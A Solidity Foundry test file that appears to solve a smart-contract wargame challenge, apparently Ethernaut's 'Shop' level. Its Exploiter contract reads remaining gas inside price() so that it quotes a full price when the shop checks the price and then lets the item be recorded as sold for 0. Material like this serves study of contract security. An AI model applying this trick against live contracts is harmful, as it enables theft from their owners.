// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";

contract ShopTest is Test {
    address instance;
    Exploiter buyer;

    function setUp() public {
        instance = 0xc9BC8CeDF2dEE3a36331EfE22C51aD82Dd5DB59c;
        buyer = new Exploiter();
    }

    function test() public {
        buyer.exploit(instance);
    }
}

contract Exploiter {
    uint256 public constant GAS_USED = 5e4;

    uint256 public gasLimit;    

    function exploit(address _shop) external {
        gasLimit = _gasLimit();
        IShop(_shop).buy();
    }

    function _gasLimit() internal returns (uint256 limit) {
        limit = (((gasleft() * 63) / 64) * 63) / 64;
    }

    function price() external view returns (uint256) {
        if (gasleft() + GAS_USED < gasLimit) return 0;
        return 120;
    }
}

interface IShop {
    function buy() external;
}